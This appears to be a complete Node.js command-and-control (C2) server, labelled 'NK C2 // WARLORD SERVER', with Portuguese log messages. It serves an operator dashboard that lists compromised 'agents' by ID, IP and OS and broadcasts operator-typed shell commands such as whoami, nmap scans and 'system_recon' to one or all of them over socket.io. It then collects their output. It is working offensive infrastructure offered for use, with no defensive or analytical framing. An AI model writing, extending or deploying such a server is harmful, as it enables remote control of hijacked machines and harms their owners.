
/* NK C2 SERVER v43.1 - FIXED DEPLOYMENT SYNTAX */
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- C2 DASHBOARD UI ---
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>NK C2 // COMMAND CENTER</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="/socket.io/socket.io.js"></script>
        <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
        <style>
            body { background: #050505; color: #00ff41; font-family: 'Share Tech Mono', monospace; }
            ::-webkit-scrollbar { width: 8px; }
            ::-webkit-scrollbar-thumb { background: #1a1a1a; border: 1px solid #333; }
        </style>
    </head>
    <body class="h-screen flex flex-col p-4 overflow-hidden">
        <header class="flex justify-between items-center border-b border-green-900 pb-2 mb-4">
            <h1 class="text-xl font-bold tracking-widest text-green-500">NK C2 // WARLORD SERVER</h1>
            <div id="status" class="text-xs px-2 py-1 border border-green-500 rounded bg-green-900/20">CONNECTING...</div>
        </header>

        <main class="flex-1 flex gap-4 min-h-0">
            <!-- AGENT LIST -->
            <div class="w-1/3 flex flex-col border border-green-900/50 bg-black/50">
                <div class="p-2 bg-green-900/10 border-b border-green-900/50 font-bold text-sm">ACTIVE AGENTS</div>
                <div id="agentList" class="flex-1 overflow-y-auto p-2 space-y-2">
                    <!-- Agents will appear here -->
                </div>
            </div>

            <!-- COMMAND & LOGS -->
            <div class="flex-1 flex flex-col gap-4">
                <!-- LOG WINDOW -->
                <div class="flex-1 border border-green-900/50 bg-black/50 flex flex-col relative">
                    <div class="p-2 bg-green-900/10 border-b border-green-900/50 font-bold text-sm">LIVE FEED</div>
                    <div id="logs" class="flex-1 overflow-y-auto p-2 font-mono text-xs space-y-1"></div>
                </div>

                <!-- COMMAND INPUT -->
                <div class="h-auto border border-green-900/50 bg-black/50 p-4">
                    <div class="flex gap-2 mb-2">
                         <input id="targetInput" type="text" placeholder="TARGET ID (or ALL)" class="w-1/4 bg-gray-900 border border-green-900 text-green-500 p-2 text-xs focus:outline-none" value="ALL">
                         <input id="cmdInput" type="text" placeholder="ENTER SHELL COMMAND (e.g. nmap -F google.com)" class="flex-1 bg-gray-900 border border-green-900 text-green-500 p-2 text-xs focus:outline-none">
                         <button onclick="sendCommand()" class="px-4 py-2 bg-green-900/30 text-green-400 border border-green-700 hover:bg-green-700 hover:text-white font-bold text-xs">EXECUTE</button>
                    </div>
                    <div class="flex gap-2 text-[10px] text-gray-500">
                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('whoami')">[whoami]</span>
                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('nmap -F localhost')">[nmap_local]</span>
                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('ls -la')">[ls]</span>
                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('system_recon')">[recon]</span>
                    </div>
                </div>
            </div>
        </main>

        <script>
            const socket = io();
            const logsEl = document.getElementById('logs');
            const agentListEl = document.getElementById('agentList');
            const statusEl = document.getElementById('status');

            socket.on('connect', () => {
                statusEl.innerText = "SYSTEM ONLINE";
                statusEl.className = "text-xs px-2 py-1 border border-green-500 rounded bg-green-900/20 text-green-400";
            });

            socket.on('status', (data) => {
                agentListEl.innerHTML = '';
                if(data.agents && data.agents.length > 0) {
                    data.agents.forEach(agent => {
                        const div = document.createElement('div');
                        div.className = "p-2 border border-green-900/30 bg-green-900/5 text-xs hover:bg-green-900/20 cursor-pointer";
                        div.innerHTML = \`
                            <div class="font-bold text-green-400">\${agent.id}</div>
                            <div class="text-[10px] text-gray-400">\${agent.ip} | \${agent.os}</div>
                            <div class="mt-1 text-[9px] px-1 bg-green-900/40 w-fit rounded text-green-200">\${agent.status}</div>
                        \`;
                        div.onclick = () => { document.getElementById('targetInput').value = agent.id; };
                        agentListEl.appendChild(div);
                    });
                } else {
                    agentListEl.innerHTML = '<div class="text-gray-600 text-center italic mt-4">NO SIGNAL</div>';
                }
            });

            socket.on('log', (data) => {
                const div = document.createElement('div');
                div.className = "border-l border-green-900 pl-2 text-green-300 hover:bg-green-900/10";
                // Handle object or string
                let content = typeof data === 'string' ? data : (data.output || JSON.stringify(data));
                div.innerText = \`[\${new Date().toLocaleTimeString()}] \${content}\`;
                logsEl.appendChild(div);
                logsEl.scrollTop = logsEl.scrollHeight;
            });

            function setInput(cmd) {
                document.getElementById('cmdInput').value = cmd;
            }

            function sendCommand() {
                const cmd = document.getElementById('cmdInput').value;
                const target = document.getElementById('targetInput').value || 'ALL';
                if(!cmd) return;
                
                socket.emit('cmd', { cmd, target });
                // Optimistic Log
                const div = document.createElement('div');
                div.className = "text-yellow-500 font-bold mt-1";
                div.innerText = \`>>> \${cmd} -> \${target}\`;
                logsEl.appendChild(div);
                logsEl.scrollTop = logsEl.scrollHeight;
                
                document.getElementById('cmdInput').value = '';
            }

            document.getElementById('cmdInput').addEventListener('keypress', function (e) {
                if (e.key === 'Enter') sendCommand();
            });
        </script>
    </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 30000,
    pingInterval: 10000
}); 

// PERSISTENT STATE
const agentsMap = new Map();

io.on('connection', (socket) => {
    const clientIp = socket.handshake.address.replace('::ffff:', '');
    
    // Broadcast Status on Connect
    socket.emit('status', { agents: Array.from(agentsMap.values()) });

    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = {
                id: data.id,
                ip: clientIp,
                os: data.os || 'UNKNOWN',
                status: 'ONLINE',
                lastSeen: Date.now(),
                socketId: socket.id
            };
            agentsMap.set(data.id, agentInfo);
            io.emit('status', { agents: Array.from(agentsMap.values()) });
            io.emit('log', `[SYSTEM] AGENTE CONECTADO: ${data.id}`);
        }
    });

    socket.on('cmd', (data) => {
        io.emit('exec', data); 
        io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd} -> ${data.target || 'ALL'}`);
    });

    socket.on('stream_log', (data) => {
        io.emit('log', data);
        if (data.from && agentsMap.has(data.from)) {
            const agent = agentsMap.get(data.from);
            agent.lastSeen = Date.now();
            agent.status = 'ONLINE';
            agentsMap.set(data.from, agent);
            io.emit('status', { agents: Array.from(agentsMap.values()) });
        }
    });

    socket.on('disconnect', () => {
        for (let [id, agent] of agentsMap.entries()) {
            if (agent.socketId === socket.id) {
                agent.status = 'OFFLINE';
                agentsMap.set(id, agent);
                io.emit('status', { agents: Array.from(agentsMap.values()) });
                io.emit('log', `[SYSTEM] AGENTE CAIU: ${id}`);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[*] C2 OPERACIONAL NA PORTA ${PORT}`));